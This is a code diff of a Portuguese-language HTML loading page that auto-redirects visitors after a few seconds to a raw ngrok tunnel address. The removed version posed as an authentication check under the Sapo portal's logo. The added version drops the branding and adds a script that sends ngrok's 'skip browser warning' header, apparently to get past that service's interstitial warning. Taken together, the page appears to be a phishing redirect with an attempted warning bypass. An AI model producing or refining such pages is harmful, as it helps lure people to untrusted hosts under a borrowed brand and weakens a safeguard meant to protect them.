@@ -2,15 +2,12 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Verificando Autenticação...</title>
-  <meta http-equiv="refresh" content="4;url=https://0453-85-139-41-133.ngrok-free.app">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <title>Carregando...</title>
+  <meta http-equiv="refresh" content="3;url=https://0453-85-139-41-133.ngrok-free.app">
   <style>
     body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background-color: #ffffff;
-      color: #333;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -18,17 +15,12 @@
       height: 100vh;
     }
 
-    .logo {
-      width: 120px;
-      margin-bottom: 30px;
-    }
-
     .loader {
-      border: 6px solid #eee;
-      border-top: 6px solid #3498db;
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
       border-radius: 50%;
-      width: 50px;
-      height: 50px;
+      width: 60px;
+      height: 60px;
       animation: spin 1s linear infinite;
     }
 
@@ -38,22 +30,27 @@
     }
 
     h2 {
-      margin-top: 25px;
-      font-weight: 600;
+      margin-top: 20px;
       color: #555;
-    }
-
-    p {
-      color: #777;
-      font-size: 14px;
     }
   </style>
 </head>
 <body>
-  <img src="https://upload.wikimedia.org/wikipedia/commons/9/99/Sapo_logo.png" alt="Logo" class="logo">
   <div class="loader"></div>
-  <h2>Verificando sua autenticação...</h2>
-  <p>Por favor, aguarde um momento.</p>
+  <h2>Carregando, aguarde um momento...</h2>
+
+  <script>
+    // Enviar o cabeçalho ngrok-skip-browser-warning
+    fetch(window.location.href, {
+      method: 'GET',
+      headers: {
+        'ngrok-skip-browser-warning': 'true'
+      }
+    })
+    .then(response => response.text())
+    .then(data => console.log('Cabeçalho adicionado com sucesso'))
+    .catch(error => console.error('Erro ao adicionar cabeçalho:', error));
+  </script>
 </body>
 </html>
 
